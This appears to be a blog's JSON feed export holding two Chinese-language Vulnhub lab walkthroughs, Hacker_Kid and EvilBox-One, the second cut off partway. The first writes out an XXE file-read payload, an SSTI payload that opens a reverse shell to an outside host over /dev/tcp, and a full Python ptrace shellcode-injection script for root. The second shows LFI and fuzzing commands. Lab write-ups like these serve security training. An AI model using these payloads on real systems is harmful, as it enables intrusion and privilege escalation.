{
    "version": "https://jsonfeed.org/version/1",
    "title": "",
    "subtitle": "",
    "icon": "https://blog.xcu.icu/images/favicon.ico",
    "description": "一个妄想全栈web小废物",
    "home_page_url": "https://blog.xcu.icu",
    "items": [
        {
            "id": "https://blog.xcu.icu/2023/07/19/Hacker_Kid-v1.0.1%E9%9D%B6%E6%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/",
            "url": "https://blog.xcu.icu/2023/07/19/Hacker_Kid-v1.0.1%E9%9D%B6%E6%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/",
            "title": "Hacker_Kid-v1.0.1靶机打靶记录",
            "date_published": "2023-07-18T16:00:00.000Z",
            "content_html": "<h2 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h2>\n<p>一个有意思的故事，一个简单的 web 漏洞，一个很有意思的提权方式</p>\n<h2 id=\"靶机描述\"><a class=\"anchor\" href=\"#靶机描述\">#</a> 靶机描述</h2>\n<p>难度：OSCP 风格的中级难度</p>\n<p>目标：拿到 root 权限</p>\n<p>hint：关注信息收集，不需要蛮力破解，在每一步都有适当的提示</p>\n<p>涉及的 攻击方法:</p>\n<ul>\n<li>主机发现</li>\n<li>端口扫描</li>\n<li>WEB 信息收集</li>\n<li>DNS 区域传输</li>\n<li>XXE 注入攻击</li>\n<li>PHP 封装器</li>\n<li>SSTI 模板注入</li>\n<li>Capabilitie 提权</li>\n</ul>\n<p>虚拟机：</p>\n<ul>\n<li>格式： 虚拟机 （Virtualbox OVA）</li>\n<li>操作系统： Linux.</li>\n</ul>\n<p>联网：</p>\n<ul>\n<li>DHCP 服务：已启用</li>\n<li>IP 地址自动分配</li>\n</ul>\n<p>发布日期：2021 年 8 月 2 日</p>\n<h2 id=\"攻击流程\"><a class=\"anchor\" href=\"#攻击流程\">#</a> 攻击流程</h2>\n<h3 id=\"信息收集\"><a class=\"anchor\" href=\"#信息收集\">#</a> 信息收集</h3>\n<p>打靶的第一步当然还是信息收集</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230719094040573.png\" alt=\"image-20230719094040573\" /></p>\n<p>这里扫描得到目标靶机的 ip 是 192.168.13.196，接下来进行一个端口的探测</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230719094210325.png\" alt=\"image-20230719094210325\" /></p>\n<p>接着对端口协议进行发现</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230719094613896.png\" alt=\"image-20230719094613896\" /></p>\n<p>这里可以看到 53 端口是一个 domain 的域名服务，服务版本是 BAND9.16.1，80 是一个 apache 的 httpd 服务，9999 是一个 Tornado 的 httpd 服务</p>\n<p>这里可以看到目标靶机的 53 端口开放着 tcp 服务，这常用与同一个域名下的两台 dns 服务器之间的通信，而我们日常中使用的 udp 协议，这里因为 nmap 默认扫描的是 tcp 协议，这里更改参数去扫描 udp 协议</p>\n<pre><code class=\"language-perl\">sudo nmap -p53 -sU 192.168.13.196\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230719102605164.png\" alt=\"image-20230719102605164\" /></p>\n<p>这里也是支持 udp 协议的，很明显这是一台 dns 服务器，但是现在不知道这台服务器包含哪些区域</p>\n<p>接下来还是先去访问看一下</p>\n<p>靶机的 80 端口</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230719101021047.png\" alt=\"image-20230719101021047\" /></p>\n<p>这里是为了可读性，我将其翻译成为中文的形式，下面贴一下原文</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230719104312944.png\" alt=\"image-20230719104312944\" /></p>\n<p>可以看到这里最下面一句话，反复强调要 dig me，这里很显然与 dig 这个工具有关，这里看一下源码</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230719110145446.png\" alt=\"image-20230719110145446\" /></p>\n<p>这里点击各个链接去查看还有没有有用的信息，但是发现上面的链接都不能正常访问，这里扫描一下目录</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230719105746080.png\" alt=\"image-20230719105746080\" /></p>\n<p>这里只有这个 index.php 可以正常访问</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230719105902947.png\" alt=\"image-20230719105902947\" /></p>\n<p>这里页面没有发生改变但是源码多了很多内容</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230719110228258.png\" alt=\"image-20230719110228258\" /></p>\n<p>这里简单的查看一下，发现有两段注释</p>\n<figure class=\"highlight html\"><figcaption data-lang=\"HTML\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">&lt;!--  </pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\t&lt;div class=\"text-mono\"></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>            &lt;a href=\"#!\"</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>               title=\"Download Theme\"</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>               class=\"btn btn-success btn-shadow px-3 my-2 ml-0 text-left\"></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>              A Button</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>            &lt;/a></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>            &lt;a href=\"#!\"</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>               class=\"btn btn-danger btn-shadow px-3 my-2 ml-0 ml-sm-1 text-left\"></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>              Another Button</pre></td></tr><tr><td data-num=\"11\"></td><td><pre>            &lt;/a></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>          &lt;/div></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>--></span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\">&lt;!--</pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>&lt;div class=\"container py-5\"></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>  &lt;h1>Thanks&lt;/h1></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre> TO DO: Use a GET parameter page_no  to view pages.</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>--></span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token comment\">&lt;!-- Optional JavaScript --></span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token comment\">&lt;!-- jQuery first, then Popper.js, then Bootstrap JS --></span></pre></td></tr></table></figure><p>这里可以看到这样一段话 Use a GET parameter page_no  to view pages. 这里提示使用 page_no 参数来查看页面，这里使用 burp 来批量看看页面有什么变化</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230719111022699.png\" alt=\"image-20230719111022699\" /></p>\n<p>这里看到当参数等于 21 的时候返回的包长度是不同的，这里去访问看一下</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230719111139180.png\" alt=\"image-20230719111139180\" /></p>\n<p>这里看到有一个域名 hackers.blackhat.local，这里编辑一下我本地的 host 文件</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230719112206993.png\" alt=\"image-20230719112206993\" /></p>\n<p>接着去访问这个域名</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230719112351062.png\" alt=\"image-20230719112351062\" /></p>\n<p>但是也没有新的发现，这里用 dig 去做一个 axfr</p>\n<pre><code class=\"language-perl\">dig axfr @192.168.13.196 blackhat.local\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230719112623103.png\" alt=\"image-20230719112623103\" /></p>\n<p>这里就拿到了目标的所有记录，这里看到这里有一个 hackerkid.blackhat.local，这里加入到 hosts 文件中</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230719113049642.png\" alt=\"image-20230719113049642\" /></p>\n<p>接着去访问这个域名</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230719113027246.png\" alt=\"image-20230719113027246\" /></p>\n<p>总算是拿到了一点新的东西，继续加新的域名</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230719113539955.png\" alt=\"image-20230719113539955\" /></p>\n<p>别的页面都没有什么新的信息，这里继续去收集 9999 端口的页面</p>\n<p>靶机的 9999 端口</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230719103227710.png\" alt=\"image-20230719103227710\" /></p>\n<p>这里是一个登录页面，使用域名去访问</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230719113919910.png\" alt=\"image-20230719113919910\" /></p>\n<p>这里都去尝试了一下，只有这个页面，在将目光放回刚刚新发现的注册页面</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230719114231479.png\" alt=\"image-20230719114231479\" /></p>\n<h3 id=\"漏洞利用xxe注入\"><a class=\"anchor\" href=\"#漏洞利用xxe注入\">#</a> 漏洞利用 XXE 注入</h3>\n<p>看到这个格式我第一反应就是这里有没有可能有 xxe 注入，这里引用一个外部资源</p>\n<pre><code>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ENTITY xxe SYSTEM 'file:///etc/passwd'&gt;]&gt;&lt;root&gt;&lt;name&gt;1&lt;/name&gt;&lt;tel&gt;1&lt;/tel&gt;&lt;email&gt;&amp;xxe;&lt;/email&gt;&lt;password&gt;1&lt;/password&gt;&lt;/root&gt;\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230719121256334.png\" alt=\"image-20230719121256334\" /></p>\n<p>可以看到注入成功了，先看一下能执行 shell 的用户都有哪些</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230719121747783.png\" alt=\"image-20230719121747783\" /></p>\n<p>除去 root 外还有一个 saket 账号可以执行 shell，下一个点在 home 目录下</p>\n<pre><code>php://filter/convert.base64-encode/resource=/home/saket/.bashrc\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230719122247052.png\" alt=\"image-20230719122247052\" /></p>\n<p>拿到了这样一段信息，这里 base 解码后</p>\n<pre><code class=\"language-bash\"># ~/.bashrc: executed by bash(1) for non-login shells.\n# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)\n# for examples\n\n# If not running interactively, don't do anything\ncase $- in\n    *i*) ;;\n      *) return;;\nesac\n\n# don't put duplicate lines or lines starting with space in the history.\n# See bash(1) for more options\nHISTCONTROL=ignoreboth\n\n# append to the history file, don't overwrite it\nshopt -s histappend\n\n# for setting history length see HISTSIZE and HISTFILESIZE in bash(1)\nHISTSIZE=1000\nHISTFILESIZE=2000\n\n# check the window size after each command and, if necessary,\n# update the values of LINES and COLUMNS.\nshopt -s checkwinsize\n\n# If set, the pattern &quot;**&quot; used in a pathname expansion context will\n# match all files and zero or more directories and subdirectories.\n#shopt -s globstar\n\n# make less more friendly for non-text input files, see lesspipe(1)\n[ -x /usr/bin/lesspipe ] &amp;&amp; eval &quot;$(SHELL=/bin/sh lesspipe)&quot;\n\n# set variable identifying the chroot you work in (used in the prompt below)\nif [ -z &quot;$&#123;debian_chroot:-&#125;&quot; ] &amp;&amp; [ -r /etc/debian_chroot ]; then\n    debian_chroot=$(cat /etc/debian_chroot)\nfi\n\n# set a fancy prompt (non-color, unless we know we &quot;want&quot; color)\ncase &quot;$TERM&quot; in\n    xterm-color|*-256color) color_prompt=yes;;\nesac\n\n# uncomment for a colored prompt, if the terminal has the capability; turned\n# off by default to not distract the user: the focus in a terminal window\n# should be on the output of commands, not on the prompt\n#force_color_prompt=yes\n\nif [ -n &quot;$force_color_prompt&quot; ]; then\n    if [ -x /usr/bin/tput ] &amp;&amp; tput setaf 1 &gt;&amp;/dev/null; then\n\t# We have color support; assume it's compliant with Ecma-48\n\t# (ISO/IEC-6429). (Lack of such support is extremely rare, and such\n\t# a case would tend to support setf rather than setaf.)\n\tcolor_prompt=yes\n    else\n\tcolor_prompt=\n    fi\nfi\n\nif [ &quot;$color_prompt&quot; = yes ]; then\n    PS1='$&#123;debian_chroot:+($debian_chroot)&#125;\\[\\033[01;32m\\]\\u@\\h\\[\\033[00m\\]:\\[\\033[01;34m\\]\\w\\[\\033[00m\\]\\$ '\nelse\n    PS1='$&#123;debian_chroot:+($debian_chroot)&#125;\\u@\\h:\\w\\$ '\nfi\nunset color_prompt force_color_prompt\n\n# If this is an xterm set the title to user@host:dir\ncase &quot;$TERM&quot; in\nxterm*|rxvt*)\n    PS1=&quot;\\[\\e]0;$&#123;debian_chroot:+($debian_chroot)&#125;\\u@\\h: \\w\\a\\]$PS1&quot;\n    ;;\n*)\n    ;;\nesac\n\n# enable color support of ls and also add handy aliases\nif [ -x /usr/bin/dircolors ]; then\n    test -r ~/.dircolors &amp;&amp; eval &quot;$(dircolors -b ~/.dircolors)&quot; || eval &quot;$(dircolors -b)&quot;\n    alias ls='ls --color=auto'\n    #alias dir='dir --color=auto'\n    #alias vdir='vdir --color=auto'\n\n    alias grep='grep --color=auto'\n    alias fgrep='fgrep --color=auto'\n    alias egrep='egrep --color=auto'\nfi\n\n# colored GCC warnings and errors\n#export GCC_COLORS='error=01;31:warning=01;35:note=01;36:caret=01;32:locus=01:quote=01'\n\n# some more ls aliases\nalias ll='ls -alF'\nalias la='ls -A'\nalias l='ls -CF'\n\n# Add an &quot;alert&quot; alias for long running commands.  Use like so:\n#   sleep 10; alert\nalias alert='notify-send --urgency=low -i &quot;$([ $? = 0 ] &amp;&amp; echo terminal || echo error)&quot; &quot;$(history|tail -n1|sed -e '\\''s/^\\s*[0-9]\\+\\s*//;s/[;&amp;|]\\s*alert$//'\\'')&quot;'\n\n# Alias definitions.\n# You may want to put all your additions into a separate file like\n# ~/.bash_aliases, instead of adding them here directly.\n# See /usr/share/doc/bash-doc/examples in the bash-doc package.\n\nif [ -f ~/.bash_aliases ]; then\n    . ~/.bash_aliases\nfi\n\n# enable programmable completion features (you don't need to enable\n# this, if it's already enabled in /etc/bash.bashrc and /etc/profile\n# sources /etc/bash.bashrc).\nif ! shopt -oq posix; then\n  if [ -f /usr/share/bash-completion/bash_completion ]; then\n    . /usr/share/bash-completion/bash_completion\n  elif [ -f /etc/bash_completion ]; then\n    . /etc/bash_completion\n  fi\nfi\n\n#Setting Password for running python app\nusername=&quot;admin&quot;\npassword=&quot;Saket!#$%@!!&quot;\n</code></pre>\n<p>这里有一个账号密码，这里应该是一个后台密码，尝试登录，但是报错了</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230719122533997.png\" alt=\"image-20230719122533997\" /></p>\n<p>发现密码是 saket・・・・，这里猜测这个密码不是 admin 的密码，而是 saket 的密码，这里尝试登录</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230719122834770.png\" alt=\"image-20230719122834770\" /></p>\n<p>这里就成功登录进来了，这里看到提示信息，这里很显然是要传入一个 name</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230719123151385.png\" alt=\"image-20230719123151385\" /></p>\n<p>这里直接回显出来了，这里能想到的就两种漏洞，xss 和 SSTI，简单的尝试一下</p>\n<h3 id=\"漏洞利用模版注入\"><a class=\"anchor\" href=\"#漏洞利用模版注入\">#</a> 漏洞利用模版注入</h3>\n<pre><code class=\"language-perl\">&#123;&#123;1+4&#125;&#125;\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230719125152589.png\" alt=\"image-20230719125152589\" /></p>\n<p>这里可以看到使用的是一个 Traceback 的开发框架，这里运行在 python3.8，这里很显然一点存在模版注入，进一步测试</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230719125430282.png\" alt=\"image-20230719125430282\" /></p>\n<pre><code>&#123;% import os %&#125;&#123;&#123;os.system('bash -c \"bash -i >& /dev/tcp/192.168.13.249/4444 0>&1\"')&#125;&#125;\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230719130338824.png\" alt=\"image-20230719130338824\" /></p>\n<p>这里就成功拿到一个 shell，只不过是一个 saket 的 shell，接下来就是提权</p>\n<h3 id=\"提权\"><a class=\"anchor\" href=\"#提权\">#</a> 提权</h3>\n<p>这个提权的方式也是比较特殊，通过 Capabilities 这个权限管理的功能来提权<span class=\"exturl\" data-url=\"aHR0cHM6Ly9tYW43Lm9yZy9saW51eC9tYW4tcGFnZXMvbWFuNy9jYXBhYmlsaXRpZXMuNy5odG1s\"> capabilities (7) - Linux manual page (man7.org)</span>，这里贴一个 Capabilities 的权限介绍</p>\n<p>使用 getcap / 查询整个系统上的 Capabilities 权限</p>\n<pre><code class=\"language-perl\">/sbin/getcap -r / 2&gt;/dev/null\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230719132204493.png\" alt=\"image-20230719132204493\" /></p>\n<p>python2.7 有一个 cap_sys_ptrace 的权限，这个权限允许跟踪任何进程，接下来的思路就是找到已经是 root 权限运行的进程然后通过这个权限来提权，接下来查看运行的进程，这里下载一下这个漏洞利用的脚本，这里直接贴过去也行</p>\n<pre><code class=\"language-python\">import ctypes\nimport sys\nimport struct\n\n\nPTRACE_POKETEXT   = 4\nPTRACE_GETREGS    = 12\nPTRACE_SETREGS    = 13\nPTRACE_ATTACH     = 16\nPTRACE_DETACH     = 17\n\n\nclass user_regs_struct(ctypes.Structure):\n    _fields_ = [\n        (&quot;r15&quot;, ctypes.c_ulonglong),\n        (&quot;r14&quot;, ctypes.c_ulonglong),\n        (&quot;r13&quot;, ctypes.c_ulonglong),\n        (&quot;r12&quot;, ctypes.c_ulonglong),\n        (&quot;rbp&quot;, ctypes.c_ulonglong),\n        (&quot;rbx&quot;, ctypes.c_ulonglong),\n        (&quot;r11&quot;, ctypes.c_ulonglong),\n        (&quot;r10&quot;, ctypes.c_ulonglong),\n        (&quot;r9&quot;, ctypes.c_ulonglong),\n        (&quot;r8&quot;, ctypes.c_ulonglong),\n        (&quot;rax&quot;, ctypes.c_ulonglong),\n        (&quot;rcx&quot;, ctypes.c_ulonglong),\n        (&quot;rdx&quot;, ctypes.c_ulonglong),\n        (&quot;rsi&quot;, ctypes.c_ulonglong),\n        (&quot;rdi&quot;, ctypes.c_ulonglong),\n        (&quot;orig_rax&quot;, ctypes.c_ulonglong),\n        (&quot;rip&quot;, ctypes.c_ulonglong),\n        (&quot;cs&quot;, ctypes.c_ulonglong),\n        (&quot;eflags&quot;, ctypes.c_ulonglong),\n        (&quot;rsp&quot;, ctypes.c_ulonglong),\n        (&quot;ss&quot;, ctypes.c_ulonglong),\n        (&quot;fs_base&quot;, ctypes.c_ulonglong),\n        (&quot;gs_base&quot;, ctypes.c_ulonglong),\n        (&quot;ds&quot;, ctypes.c_ulonglong),\n        (&quot;es&quot;, ctypes.c_ulonglong),\n        (&quot;fs&quot;, ctypes.c_ulonglong),\n        (&quot;gs&quot;, ctypes.c_ulonglong),\n    ]\n\nlibc = ctypes.CDLL(&quot;libc.so.6&quot;)\n\npid=int(sys.argv[1])\n\n# Define argument type and respone type.\nlibc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]\nlibc.ptrace.restype = ctypes.c_uint64\n\n# Attach to the process\nlibc.ptrace(PTRACE_ATTACH, pid, None, None)\nregisters=user_regs_struct()\n\n# Retrieve the value stored in registers\nlibc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))\n\nprint(&quot;Instruction Pointer: &quot; + hex(registers.rip))\n\nprint(&quot;Injecting Shellcode at: &quot; + hex(registers.rip))\n\n# Shell code copied from exploit db.\nshellcode=&quot;\\x48\\x31\\xc0\\x48\\x31\\xd2\\x48\\x31\\xf6\\xff\\xc6\\x6a\\x29\\x58\\x6a\\x02\\x5f\\x0f\\x05\\x48\\x97\\x6a\\x02\\x66\\xc7\\x44\\x24\\x02\\x15\\xe0\\x54\\x5e\\x52\\x6a\\x31\\x58\\x6a\\x10\\x5a\\x0f\\x05\\x5e\\x6a\\x32\\x58\\x0f\\x05\\x6a\\x2b\\x58\\x0f\\x05\\x48\\x97\\x6a\\x03\\x5e\\xff\\xce\\xb0\\x21\\x0f\\x05\\x75\\xf8\\xf7\\xe6\\x52\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x53\\x48\\x8d\\x3c\\x24\\xb0\\x3b\\x0f\\x05&quot;\n\n# Inject the shellcode into the running process byte by byte.\nfor i in xrange(0,len(shellcode),4):\n \n  # Convert the byte to little endian.\n  shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)\n  shellcode_byte_little_endian=struct.pack(&quot;&lt;I&quot;, shellcode_byte_int).rstrip('\\x00').encode('hex')\n  shellcode_byte=int(shellcode_byte_little_endian,16)\n \n  # Inject the byte.\n  libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)\n\nprint(&quot;Shellcode Injected!!&quot;)\n\n# Modify the instuction pointer\nregisters.rip=registers.rip+2\n\n# Set the registers\nlibc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))\n\nprint(&quot;Final Instruction Pointer: &quot; + hex(registers.rip))\n\n# Detach from the process.\nlibc.ptrace(PTRACE_DETACH, pid, None, None)\n</code></pre>\n<pre><code class=\"language-perl\">git clone https://gitee.com/Re1-zf/shell.git\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230719134433363.png\" alt=\"image-20230719134433363\" /></p>\n<pre><code class=\"language-bash\">python2.7 inject.py 902\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230719134533090.png\" alt=\"image-20230719134533090\" /></p>\n<p>查看一下当前是不是已经开启了 5600 端口</p>\n<pre><code>ss -pantu |grep 5600\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230719134701291.png\" alt=\"image-20230719134701291\" /></p>\n<p>直接 nc 上去即可</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230719134737944.png\" alt=\"image-20230719134737944\" /></p>\n",
            "tags": [
                "Vulnhub",
                "Vulnhub"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2023/07/18/EvilBox---One%E9%9D%B6%E6%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/",
            "url": "https://blog.xcu.icu/2023/07/18/EvilBox---One%E9%9D%B6%E6%9C%BA%E6%89%93%E9%9D%B6%E8%AE%B0%E5%BD%95/",
            "title": "EvilBox - One靶机打靶记录",
            "date_published": "2023-07-17T16:00:00.000Z",
            "content_html": "<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>“关关难过关关过，前路漫漫亦灿灿。日日煎熬日日熬，往事堪堪亦澜澜。”，骚话说完了开始今天了打靶任务</p>\n<h2 id=\"靶机描述\"><a href=\"#靶机描述\" class=\"headerlink\" title=\"靶机描述\"></a>靶机描述</h2><p>难度等级：中级偏低</p>\n<p>打靶目标：取得 root 权限</p>\n<p>涉及攻击方法:</p>\n<ul>\n<li>主机发现</li>\n<li>网络扫描</li>\n<li>强制访问</li>\n<li>参数爆破</li>\n<li>文件包含</li>\n<li>PHP封装器</li>\n<li>任意文件读取</li>\n<li>SSH公钥登录</li>\n<li>离线密码破解</li>\n<li>系统权限漏洞利用</li>\n</ul>\n<p>虚拟机：</p>\n<ul>\n<li>格式： 虚拟机 （Virtualbox OVA）</li>\n<li>操作系统： Linux.</li>\n</ul>\n<p>联网：</p>\n<ul>\n<li>DHCP 服务：已启用</li>\n<li>IP 地址自动分配</li>\n</ul>\n<h2 id=\"攻击流程\"><a href=\"#攻击流程\" class=\"headerlink\" title=\"攻击流程\"></a>攻击流程</h2><h3 id=\"信息收集\"><a href=\"#信息收集\" class=\"headerlink\" title=\"信息收集\"></a>信息收集</h3><p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230718155751758.png\" alt=\"image-20230718155751758\"></p>\n<p>这里扫描到ip为192.168.13.254，接下来扫描开放的接口</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230718155842513.png\" alt=\"image-20230718155842513\"></p>\n<p>接下来协议的发现</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230718160051047.png\" alt=\"image-20230718160051047\"></p>\n<p>就是老一套的东西，接下来通过浏览器去访问80端口</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230718160308935.png\" alt=\"image-20230718160308935\"></p>\n<p> 没有什么能利用的地方，接着去扫描目录</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230718160436987.png\" alt=\"image-20230718160436987\"></p>\n<p>这里分别访问这几个目录</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230718160810760.png\" alt=\"image-20230718160810760\"></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230718160905926.png\" alt=\"image-20230718160905926\"></p>\n<p>但是这里发现是空的</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230718164642985.png\" alt=\"image-20230718164642985\"></p>\n<p>这里进一步路径爆破</p>\n<pre><code class=\"perl\">sudo gobuster dir -u http://192.168.13.254/secret -w /usr/share/seclists/Discovery/Web-Content/directory-list-1.0.txt -x txt,php,html\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230718165509161.png\" alt=\"image-20230718165509161\"></p>\n<h3 id=\"文件包含漏洞利用\"><a href=\"#文件包含漏洞利用\" class=\"headerlink\" title=\"文件包含漏洞利用\"></a>文件包含漏洞利用</h3><p>这里可以看到，新爆破出来了一个evil.php，这里的暗示已经很明显了</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230718165631960.png\" alt=\"image-20230718165631960\"></p>\n<p>但是这里访问还是没有东西，这里接下来就进行一个参数的爆破</p>\n<pre><code class=\"perl\">ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:A -w /home/joker/Desktop/1.txt:B -u http://192.168.13.254/secret/evil.php?A=B -fs 0\n</code></pre>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230718170700178.png\" alt=\"image-20230718170700178\"></p>\n<p>这里1.txt是我自己写的一个小字典，这里可以看到当参数为command，值为&#x2F;etc&#x2F;passwd的时候是有回显的，这里去访问尝试一下</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230718170900476.png\" alt=\"image-20230718170900476\"></p>\n<p>这里可以看到，这里是可以直接读取文件，这里去尝试.&#x2F;eval.php</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230718171040172.png\" alt=\"image-20230718171040172\"></p>\n<p>这里发现回显也是空的，这里可以猜测这里是使用了include函数，这里使用php伪协议来读取，先尝试有没有开启远程文件包含，如果有就很简单了</p>\n<p>这里启动kali上的http服务，用上面的文件包含来包含一个木马文件</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230718171659067.png\" alt=\"image-20230718171659067\"></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230718171713875.png\" alt=\"image-20230718171713875\"></p>\n<p>但是这里很显然失败了，这里可能是远程包含未开启，这里使用伪协议进行文件读取</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230718172239263.png\" alt=\"image-20230718172239263\"></p>\n<p>解码</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230718172311460.png\" alt=\"image-20230718172311460\"></p>\n<p>很显然刚刚猜测的没有问题，但是这里我没有看见能够进一步利用的点</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230718173006388.png\" alt=\"image-20230718173006388\"></p>\n<h3 id=\"ssh登录\"><a href=\"#ssh登录\" class=\"headerlink\" title=\"ssh登录\"></a>ssh登录</h3><p>这里可以看到有一个mowre用户，这里很显然要从这里突破，这里又回头去探测了一下ssh连接时的信息</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230718173256234.png\" alt=\"image-20230718173256234\"></p>\n<p>这里可以看见，它可以支持密码和公钥文件，这里可以去读取这个文件</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230718173932714.png\" alt=\"image-20230718173932714\"></p>\n<p>这里就拿到了这个私钥文件</p>\n<p><img 